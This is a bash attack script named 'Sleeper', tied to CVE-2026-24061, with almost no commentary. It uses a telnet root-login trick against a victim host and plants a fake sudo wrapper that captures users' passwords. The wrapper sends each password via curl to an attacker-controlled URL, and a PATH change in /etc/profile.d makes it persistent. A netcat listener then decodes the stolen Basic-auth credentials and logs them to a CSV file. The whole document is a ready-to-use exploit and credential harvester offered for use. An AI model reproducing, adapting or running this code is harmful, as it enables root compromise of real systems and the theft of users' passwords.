#!/bin/bash
# Sleeper - CVE-2026-24061
VICTIM="xyz" #borderline useless but still pretty nice to have ig
PORT=xyz #borderline useless but still pretty nice to have ig
# replace the //replace_me// blocks

echo "Running Sleeper"

(
    sleep 3
    echo "echo '[INFO] Deploying sudo harvester...'"

    echo "cat > /usr/local/bin/sudo << 'WRAP'"
    echo "#!/bin/bash"
    echo "echo -n \"[sudo] password for \$(whoami): \""
    echo "read -s pass"
    echo "echo \"\""
    echo "curl -su \"\$(whoami):\$pass\" -o /dev/null \"http://REPLACE_ME//://REPLACE_ME//\" 2>/dev/null || true"
    echo "echo \"Sorry, try again.\""
    echo "exec /usr/bin/sudo \"\$@\""
    echo "WRAP"

    echo "chmod 755 /usr/local/bin/sudo"


    echo "cat > /etc/profile.d/zz-sudo-path.sh << 'PATH'"
    echo "export PATH=\"/usr/local/bin:/usr/local/sbin:\$PATH\""
    echo "PATH"

    echo "chmod 644 /etc/profile.d/zz-sudo-path.sh"
    echo "echo '[DONE] Harvester deployed successfully!'"
    echo "exit"
) | USER="-me root" telnet -a "$VICTIM"

echo ""
echo "[DONE] Exploit commands sent."
echo "[INFO] Starting credential listener on port $PORT..."


echo "victim_ip,username,password,timestamp" > hits.csv

while true; do
    auth=$(nc -l -p "$PORT" -k 2>/dev/null | grep -i '^Authorization: Basic ' | head -1)
    
    if [[ -n "$auth" ]]; then
        b64=$(echo "$auth" | sed 's/.*Basic //' | tr -d '\r\n ')
        decoded=$(echo "$b64" | base64 -d 2>/dev/null)
        
        if [[ $? -eq 0 && "$decoded" == *:* ]]; then
            ts=$(date '+%H:%M:%S')
            echo "$VICTIM,$decoded,$ts" >> hits.csv
            echo "[INFO] HIT -> $decoded [$ts]"
        fi
    fi
    sleep 0.3
done